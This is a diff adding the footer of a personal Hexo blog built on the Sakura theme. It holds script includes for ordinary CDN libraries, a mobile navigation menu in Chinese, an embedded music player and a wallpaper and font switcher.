+          </div>
+        
+    </div><!-- .site-info -->
+</footer>
+
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/js/InsightSearch.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/js/sakura-app.js"></script>
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!-- fancybox大图查看 需jq -->
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/js/jquery.fancybox.min.js"></script>
+  <script>
+    $('[data-fancybox="images"]').fancybox({
+      thumbs : {
+        autoStart : true //缩略图
+      }
+    });
+    $('[data-fancybox]').fancybox({
+      protect: true,//图片右键不能下载
+      youtube : {
+          controls : 0,
+          showinfo : 0
+      },
+      vimeo : {
+          color : 'f00'
+      }
+    });
+  </script>
+
+
+<!-- 自适应浏览器 -->
+<script type="text/javascript">
+  /* <![CDATA[ */
+  if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+    var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+  } else {
+    var Poi = {"pjax":"1","movies":{"url": "","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+  }
+  /* ]]> */
+  
+  </script>
+  <script>
+  $(document).ready(function() {
+    if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+      if ($(".pattern-center").length > 0) { //有图的情况
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '.toc', // 放置目录的容器
+            // Where to grab the headings to build the table of contents.
+            contentSelector: '.entry-content', // 正文内容所在
+            // Which headings to grab inside of the contentSelector element.
+            scrollSmooth: true,
+            headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+            headingsOffset: -400,
+            scrollSmoothOffset: -85
+        });
+      } else {
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '.toc', // 放置目录的容器
+            // Where to grab the headings to build the table of contents.
+            contentSelector: '.entry-content', // 正文内容所在
+            // Which headings to grab inside of the contentSelector element.
+            scrollSmooth: true,
+            headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+            headingsOffset: -85,
+            scrollSmoothOffset: -85
+        });
+      }
+      var offsetTop = $('.toc').offset().top - 95;
+      window.onscroll = function() {
+        var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+        if (scrollTop >= offsetTop) {
+          $('.toc').addClass('toc-fixed');
+        } else {
+          $('.toc').removeClass('toc-fixed');
+        }
+      }
+    }
+  });
+  </script>
+    <!-- Side menu -->
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <!-- Floating window -->
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">s1riuss1rius's blog</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/cns1rius" class="fa fa-github" target="_blank" style="color: #333; margin-left: 20px"></a>
+      
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=MjkxNjExNzQ3Mw==" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left: 20px"></a>
+      
+        <a href="https://blog.csdn.net/qq_62414126" class="fa fa-star" target="_blank" style="color: #ff9900; margin-left: 20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/analytics/">
+                  <i class="fa fa-line-chart" aria-hidden="true"></i>
+                  统计
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags">
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                  标签
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/ctf/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  ctf
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/生活/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/artitalk/">
+                  <i class="fa fa-commenting-o fa-commenting" aria-hidden="true"></i>
+                  说说
+                </a>
+              </li>
+            
+              <li>
+                <a href="/photos/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  相册
+                </a>
+              </li>
+            
+              <li>
+                <a href="/books/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  悦读
+                </a>
+              </li>
+            
+              <li>
+                <a href="/movies/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  追剧
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/donate/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+            赞赏
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/about/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2020 hexo-sakuraplus</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    enable="true"
+
+    id="8438651300"
+
+    server="tencent"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.3"
+
+    mutex="true"
+
+>
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+
+   <!-- pages壁纸切换 -->
+ 
+    <div class="skin-menu no-select" id="mainskin"  style="position: fixed">
+        <div class="theme-controls row-container">
+            <ul class="menu-list">
+                <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+                <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+                <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+                <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+                <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+                <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+                <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+                <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+            </ul>
+        </div>
+        <div class="font-family-controls row-container">
+            <button type="button" class="control-btn-serif selected" data-mode="serif" onclick="mashiro_global.font_control.change_font()">Serif</button>
+            <button type="button" class="control-btn-sans-serif" data-mode="sans-serif" onclick="mashiro_global.font_control.change_font()">Sans Serif</button>
+        </div>
+    </div>   
+    <canvas id="night-mode-cover"></canvas> 
+        <div class="changeSkin-gear no-select">
+        <div class="keys" id="setbtn"> <span id="open-skinMenu"> 切换壁纸 | SCHEME TOOL 
+            &nbsp;<i class="iconfont icon-gear inline-block rotating"></i> </span></div>
+    </div><!-- skin.end -->
+
+  <!-- left side bar -->
+
+ </body>
+</html>
